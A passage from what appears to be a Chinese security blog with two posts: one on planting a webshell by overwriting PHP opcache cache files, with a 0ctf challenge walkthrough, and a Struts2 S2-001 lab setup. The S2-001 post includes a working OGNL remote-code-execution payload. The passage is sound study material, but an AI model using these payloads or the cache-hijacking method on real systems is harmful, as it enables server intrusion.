<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcache.file_cache_only = 1 #默认是0，设置为1后强制所有缓存以文件形式存在，否则可能缓存可能会存在于内存中</span><br><span class="line">opcache.file_cache = /tmp/cache #默认为空，这个目录php不会帮我们创建，一定要自己手动创建</span><br></pre></td></tr></table></figure>
<h2 id="缓存路径">缓存路径</h2>
<p>简单的举个栗子，比如我们访问<code>/var/www/html/index.php</code>，那么字节缓存的路径是<code>/tmp/cache/[system_id]/var/www/html/index.php.bin</code>。其中system_id，由php veriosn，Zend Extension Build，System（系统架构）三部分决定。这三样的东西都可以在phpinfo找到。具体的自动化生成脚本可以在<a href="https://github.com/GoSecure/php7-opcache-override/blob/master/system_id_scraper.py">github的这个项目</a>中找到。<strong>在下文中把字节码文件简称问bin文件，把与之对应的php文件简称为源文件。</strong></p>
<h2 id="利用方法">利用方法</h2>
<p>正如上面提到的，在opcache机制下，有bin文件会直接执行bin文件，那么如果配合上传漏洞这一类漏洞是不是达到将bin写到指定目录，然后访问相应的php文件达到隐蔽getshell的目的？</p>
<h2 id="利用的限制">利用的限制</h2>
<p>根据前面的描述，我们可以总结如下的限制条件</p>
<ol>
<li>opcache要打开(php7自带但默认不打开)</li>
<li>opcache.file_cache_only = 1</li>
<li>知道systemid，opcache缓存目录</li>
<li>类文件上传漏洞</li>
<li>知道bin文件所对应php的时间戳（一个秒级时间戳，这点稍后会解释）</li>
</ol>
<p>前三点可以通过phpinfo直接或计算得知，重点说说第五点，在phpinfo中有个叫opcache.validate_timestamps的配置它默认为1，这应该是为安全性而考虑的，在bin文件在创建时会在文件内容中写入一个时间戳，这个时间戳跟源文件一样，在执行bin文件之前php会检查时间戳是否一致，如果不一致则丢弃重新创建bin文件。个人认为第五点是最苛刻的因为在cms闭源的情况下几乎不可猜。</p>
<h2 id="bin文件结构分析">bin文件结构分析</h2>
<p>依然在刚才给出的链接中下载分析模板，并在010editor中导入，不要用010editor自带的分析模板有坑。用红色框标注的地方就是和目标服务器不一样需要修改的地方，原谅我啰嗦一遍，这三个框分别代表system_id, 时间戳，路径。</p>
<p><img src="fenxi.png" alt="fenxi.png"></p>
<h2 id="实验验证">实验验证</h2>
<p>kali phpinfo.php<br>
ubuntu phpinfo.php</p>
<p><img src="kaliphpinfo.png" alt="kaliphpinfo.png"></p>
<p>拿到kali的phpinfo bin文件</p>
<p><img src="ubuntuphpinfo.png" alt="ubuntuphpinfo.png"></p>
<p>修改时间戳 system_id</p>
<p><img src="c1.png" alt="c1.png"></p>
<p>复制ubuntu相应文件中然后重新访问</p>
<p><img src="c2.png" alt="c2.png"></p>
<p><img src="ubuntunewphpinfo.png" alt="ubuntunewphpinfo.png"></p>
<h2 id="CTF中">CTF中</h2>
<p>这次在0ctf遇到了这种攻击方式，代码是这样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span> . <span class="string">&quot;index.php&quot;</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">touch</span>(<span class="variable">$dir</span> . <span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$dir</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//如果不是目录就删除</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;<span class="comment">//删除非. ..的文件</span></span><br><span class="line">  <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>) <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, [<span class="string">&quot;.&quot;</span>, <span class="string">&quot;..&quot;</span>])) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$dir</span> . <span class="variable">$file</span>);</span><br><span class="line">  &#125;<span class="comment">//删除目录</span></span><br><span class="line">  <span class="title function_ invoke__">rmdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;phpinfo&#x27;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;phpinfo.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">    <span class="title function_ invoke__">clear</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;time&#x27;</span>:</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;go in to upload&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">clear</span>(<span class="variable">$dir</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$dir</span> . <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-zA-Z0-9.\/]/&quot;</span>, <span class="variable">$name</span>) ||</span><br><span class="line">      <span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>)[<span class="string">&quot;extension&quot;</span>], <span class="string">&quot;h&quot;</span>)) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;go in to move&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$size</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>) <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file</span>, [<span class="string">&quot;.&quot;</span>, <span class="string">&quot;..&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$size</span> += <span class="title function_ invoke__">filesize</span>(<span class="variable">$dir</span> . <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">clear</span>(<span class="variable">$dir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;shell&#x27;</span>:</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/var/www/html/<span class="subst">$dir</span>:/var/www/html/flag&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$dir</span> . <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>?action=phpinfo可以得到system_id<br>
<code>7.0.28API3 151012,NTSBIN_SIZEOF_CHAR48888 -&gt; 7badddeddbd076fe8352e80d8ddf3e73</code></p>
<p>?action=pwd 拿到自己路径<code>sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/</code></p>
<p>结合上面的两个进一步推断出缓存路径<code>/tmp/cache/7badddeddbd076fe8352e80d8ddf3e73/var/www/html/sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/index.php</code></p>
<p>在自己本地环境中建立<code>sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/index.php</code>并写上自己的payload,**切记这一点当时没有做出来就是本地没有建立一模一样的路径。**目测都有ban函数，所以就纯写了一点东西，验证线上是否能输出。</p>
<p><img src="test.png" alt="test.png"></p>
<p>然后测试了<code>glob</code>，发现没有结果最后用</p>
<p>读到目录，然后用之前给的代码中已经使用的high_light读文件（肯定不会被ban）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;/var/wwwml/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="dir.png" alt="dir.png"></p>
<p><img src="content.jpg" alt="content.jpg"></p>
<p>读出来又是是一个bin文件，不会逆。。。</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>s2-001 代码分析</title>
    <url>/2019/10/09/s2-001%20%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<!-- more -->
<h2 id="环境搭建">环境搭建</h2>
<p><img src="./1570086393603.png" alt="Alt text"></p>
<p><img src="./1570086655844.png" alt="Alt text"></p>
<p>pom.xml中加入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;2.0.8&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p><img src="./1570086841119.png" alt="Alt text"></p>
<p><img src="./1570086870550.png" alt="Alt text"></p>
<p><img src="./1570086949529.png" alt="Alt text"></p>
<p>index.jsp</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">         pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;S2-<span class="number">001</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-<span class="number">001</span> Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">&quot;https://cwiki.apache.org/confluence/display/WW/S2-001&quot;</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">&quot;login&quot;</span>&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">&quot;username&quot;</span> label=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">&quot;password&quot;</span> label=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">  &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>welcome.jsp</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">         pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-<span class="number">001</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value=<span class="string">&quot;username&quot;</span>&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>struts.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;s2-001&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.s2001.LoginAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;WebApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;3.1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>LoginAction.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.s2001;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.username.isEmpty()) || (<span class="built_in">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.username.equalsIgnoreCase(<span class="string">&quot;admin&quot;</span>))</span><br><span class="line">                &amp;&amp; (<span class="built_in">this</span>.password.equals(<span class="string">&quot;admin&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="./1570535595262.png" alt="Alt text"></p>
<p><img src="./1570087619139.png" alt="Alt text"><br>
访问 <a href="http://localhost:8888/s2_001_war_exploded/">http://localhost:8888/s2_001_war_exploded/</a><br>
<img src="./1570088616630.png" alt="Alt text"></p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>username 随便填，password填poc，注意需要url编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">    #a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">    #b=#a.getInputStream(),</span><br><span class="line">    #c=new java.io.InputStreamReader(#b),</span><br><span class="line">    #d=new java.io.BufferedReader(#c),</span><br><span class="line">    #e=new char[50000],</span><br><span class="line">    #d.read(#e),</span><br><span class="line">    #f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">    #f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">    #f.getWriter().flush(),</span><br><span class="line">    #f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果如下<br>
<img src="./1570088933307.png" alt="Alt text"></p>
<h2 id="预备知识-OGNL">预备知识-OGNL</h2>
<p>s2的很多rce洞都是提交的ognl表达式被服务端解析执行而造成，有必要在之前先作一定的了解。</p>
<h3 id="介绍">介绍</h3>
<p>OGNL全称是对象视图导航语言（Object-Graph Navigation Language），它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。</p>
<h3 id="OGNL-的使用">OGNL 的使用</h3>
<p>传统的OGNL可以放一个Object到root，放一个Map到values（很多文章都叫它Context）。<br>
<img src="./1570103787183.png" alt="Alt text"></p>
<p>获取root、Context的值或执行其内部方法的方式都差不多，唯一的区别就是获取Context下的信息时需要加前缀<code>#key</code>或<code>@key</code>(静态变量，静态方法)，看下面例子。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ognltest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OgnlTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        User.fun1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun1</span><span class="params">()</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="comment">//准备root</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">u1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//准备context</span></span><br><span class="line">        Map&lt;String,User&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String,User&gt;();</span><br><span class="line">        context.put(<span class="string">&quot;key&quot;</span>, <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;user2&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置root和context</span></span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">ognl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line">        ognl.setRoot(u1);</span><br><span class="line">        ognl.setValues(context);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取出root中的数据，直接写属性名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">rootname</span> <span class="operator">=</span> (String) Ognl.getValue(<span class="string">&quot;name&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(rootname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取出context中的属性值</span></span><br><span class="line">        <span class="comment">//#代表从context中取值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">contextname</span> <span class="operator">=</span> (String) Ognl.getValue(<span class="string">&quot;#key.name&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(contextname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改root中数据</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;name = &#x27;user3&#x27;&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        rootname = (String) Ognl.getValue(<span class="string">&quot;name&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(rootname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改context中数据</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;#key.name = &#x27;user4&#x27;&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        contextname = (String) Ognl.getValue(<span class="string">&quot;#key.name&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(contextname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用root中方法</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;setName(&#x27;user5&#x27;)&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        rootname = (String)Ognl.getValue(<span class="string">&quot;whoami()&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(rootname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用context中方法</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;#key.setName(&#x27;user6&#x27;)&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        contextname = (String)Ognl.getValue(<span class="string">&quot;#key.whoami()&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(contextname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用静态方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">funcreturnvalue</span> <span class="operator">=</span> (String) Ognl.getValue(<span class="string">&quot;@com.example.ognltest.User@func2()&quot;</span>, ognl, ognl.getRoot());</span><br><span class="line">        System.out.println(funcreturnvalue);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用静态属性</span></span><br><span class="line">        <span class="type">Double</span> <span class="variable">pi</span> <span 